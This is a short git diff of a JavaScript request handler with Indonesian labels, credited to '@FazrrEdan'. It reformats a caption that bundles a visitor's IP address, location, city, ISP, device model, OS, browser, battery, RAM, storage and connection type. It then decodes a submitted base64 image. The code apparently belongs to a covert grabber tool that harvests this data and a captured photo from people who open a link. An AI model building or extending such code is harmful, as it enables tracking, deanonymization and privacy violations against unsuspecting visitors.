@@ -51,23 +51,26 @@ export default async function handler(req, res) {
 
     const bahasa = req.headers["accept-language"]?.split(",")[0] || "Tidak diketahui";
 
-    const caption = `🛠️ Dev By @FazrrEdan
-    
-🌍 IP: ${ip}
-🌏 Negara: ${countryName}
-📍 Lokasi: ${lokasi}
-🏙️ Provinsi & Kota: ${provinsiKota}
-🗣️ Bahasa: ${bahasa}
-🌐 ISP: ${isp}
-🕒 Jam: ${waktu}
-🔧 Perangkat: ${device.model || "Tidak diketahui"}
-💻 OS: ${os.name} ${os.version}
-🌐 Browser: ${browser.name} ${browser.version}
-🦸 User-Agent: ${userAgent}
-🔋 Baterai: ${deviceInfo.batteryLevel}% (${deviceInfo.isCharging ? "Sedang mengisi daya" : "Tidak mengisi daya"})
-💾 RAM: ${deviceInfo.ram} GB
-📱 Penyimpanan: ${deviceInfo.usedStorage} / ${deviceInfo.totalStorage}
-📶 Koneksi: ${deviceInfo.connection}
+    const caption = `Dev By @FazrrEdan
+
+🌎 Informasi Pengguna 
+-IP: ${ip}
+-Negara: ${countryName}
+-Lokasi: ${lokasi}
+-Provinsi & Kota: ${provinsiKota}
+-Bahasa: ${bahasa}
+-ISP: ${isp}
+-Jam: ${waktu}
+
+-Perangkat: ${device.model || "Tidak diketahui"}
+-OS: ${os.name} ${os.version}
+-Browser: ${browser.name} ${browser.version}
+-User-Agent: ${userAgent}
+
+-Baterai: ${deviceInfo.batteryLevel}% (${deviceInfo.isCharging})
+-RAM: ${deviceInfo.ram} GB
+-Penyimpanan: ${deviceInfo.usedStorage} / ${deviceInfo.totalStorage}
+-Koneksi: ${deviceInfo.connection}
 `;
 
     const imageBuffer = Buffer.from(image.split(",")[1], "base64");
